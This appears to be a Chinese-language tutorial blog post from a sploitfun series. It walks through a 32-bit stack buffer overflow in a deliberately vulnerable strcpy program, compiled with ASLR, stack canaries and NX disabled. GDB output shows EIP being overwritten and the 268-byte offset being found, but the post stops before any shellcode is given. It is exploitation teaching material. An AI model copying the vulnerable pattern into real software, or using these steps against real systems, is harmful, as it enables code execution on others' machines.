---
layout: post
title: 经典的栈溢出 
excerpt: "1.1 return to shellcode"
categories: [sploitfun系列教程]
comments: true
---

漏洞代码
```c
//vuln.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
        /* [1] */ char buf[256];
        /* [2] */ strcpy(buf,argv[1]);
        /* [3] */ printf("Input:%s\n",buf);
        return 0;
}
```
编译
```shell
echo 0 > /proc/sys/kernel/randomize_va_space
gcc -g -fno-stack-protector -z execstack -o vuln vuln.c -m32
chmod 777 vuln
```
上边的代码中第二部分存在溢出漏洞。

### Return Address Overwrite
通过覆盖‘return address’地址来实现代码运行

首先查看main方法中的汇编
```shell
gdb-peda$ disassemble main                                                      #用户输入部分
Dump of assembler code for function main:
   0x0804843d <+0>:	push   ebp
   0x0804843e <+1>:	mov    ebp,esp
   0x08048440 <+3>:	and    esp,0xfffffff0
   0x08048443 <+6>:	sub    esp,0x110
   0x08048449 <+12>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804844c <+15>:	add    eax,0x4
   0x0804844f <+18>:	mov    eax,DWORD PTR [eax]
   0x08048451 <+20>:	mov    DWORD PTR [esp+0x4],eax
   0x08048455 <+24>:	lea    eax,[esp+0x10]
   0x08048459 <+28>:	mov    DWORD PTR [esp],eax
   0x0804845c <+31>:	call   0x8048310 <strcpy@plt>
   0x08048461 <+36>:	lea    eax,[esp+0x10]
   0x08048465 <+40>:	mov    DWORD PTR [esp+0x4],eax
   0x08048469 <+44>:	mov    DWORD PTR [esp],0x8048514
   0x08048470 <+51>:	call   0x8048300 <printf@plt>
   0x08048475 <+56>:	mov    eax,0x0
   0x0804847a <+61>:	leave  
   0x0804847b <+62>:	ret    
End of assembler dump.

```
#### 测试第一步：Return Address是否可以被覆盖
```shell
 H localhost.localdomain  root  ~ | sploitfun  gdb vuln                         #用户输入部分
GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-115.el7
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /root/sploitfun/vuln...done.
gdb-peda$ r `python -c 'print "A"*300'`                                         #用户输入部分
Starting program: /root/sploitfun/vuln `python -c 'print "A"*300'`
Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xf7fc9000 --> 0x1c6d88 
ECX: 0x0 
EDX: 0xf7fca898 --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd530 ('A' <repeats 28 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd530 ('A' <repeats 28 times>)
0004| 0xffffd534 ('A' <repeats 24 times>)
0008| 0xffffd538 ('A' <repeats 20 times>)
0012| 0xffffd53c ('A' <repeats 16 times>)
0016| 0xffffd540 ('A' <repeats 12 times>)
0020| 0xffffd544 ("AAAAAAAA")
0024| 0xffffd548 ("AAAA")
0028| 0xffffd54c --> 0x804a000 --> 0x8049f14 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
Missing separate debuginfos, use: debuginfo-install glibc-2.17-292.el7.i686
gdb-peda$ p/x $eip                                                              #用户输入部分
$1 = 0x41414141

```
#### 测试第二步：缓冲区到Return Address的offset是多少
结果显示offset为`0x10c`
> 0x10c = 0x100 + 0x8 + 0x4

其中
- 0x100是`buf`的长度
- 0x8 是栈对齐长度（alignment space）
- 0x4 存放呼叫者（本文中的main方法）的EBP值

我们来验证下：通过输入`“A” * 268 + “B” * 4`来将return address将"AAAA"变为"BBBB"
```shell
 H localhost.localdomain  root  ~ | sploitfun  gdb vuln                         #用户输入部分
GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-115.el7
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /root/sploitfun/vuln...done.
gdb-peda$ r `python -c 'print "A"*268 + "B"*4'`                                 #用户输入部分
Starting program: /root/sploitfun/vuln `python -c 'print "A"*268 + "B"*4'`
Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xf7fc9000 --> 0x1c6d88 
ECX: 0x0 
EDX: 0xf7fca898 --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd540 --> 0x0 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd540 --> 0x0 
0004| 0xffffd544 --> 0xffffd5d4 --> 0xffffd71c ("/root/sploitfun/vuln")
0008| 0xffffd548 --> 0xffffd5e0 --> 0xffffd842 ("XDG_SESSION_ID=1084")
0012| 0xffffd54c --> 0xf7fd86b0 --> 0x8048275 ("GLIBC_2.0")
0016| 0xffffd550 --> 0x1 
0020| 0xffffd554 --> 0x1 
0024| 0xffffd558 --> 0x0 
0028| 0xffffd55c --> 0x804a014 --> 0xf7e1c1b0 (<__libc_start_main>:	push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
Missing separate debuginfos, use: debuginfo-install glibc-2.17-292.el7.i686
```
这样我们就可以通过控制return address来控制程序

### exp流程
查看程序保护方式
```shell
 H localhost.localdomain  root  ~ | sploitfun  python                           #用户输入部分
Python 2.7.5 (default, Aug  7 2019, 00:51:29) 
[GCC 4.8.5 20150623 (Red Hat 4.8.5-39)] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *                                                           #用户输入部分
>>> ELF('vuln').checksec()                                                      #用户输入部分
[*] '/root/sploitfun/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

